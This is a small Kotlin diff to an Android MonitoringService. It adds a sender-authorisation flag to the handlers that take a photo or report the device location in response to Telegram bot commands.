@@ -1104,10 +1104,10 @@ class MonitoringService : Service() {
                 when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
                     "camera", "photo" -> {
                         restartCameraLoop()
-                        handleTelegramCommand("/photo", sentAtSec)
+                        handleTelegramCommand("/photo", sentAtSec, senderOk)
                     }
                     "location", "loc", "gps" -> {
-                        handleTelegramCommand("/location", sentAtSec)
+                        handleTelegramCommand("/location", sentAtSec, senderOk)
                     }
                     "" -> {
                         val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true
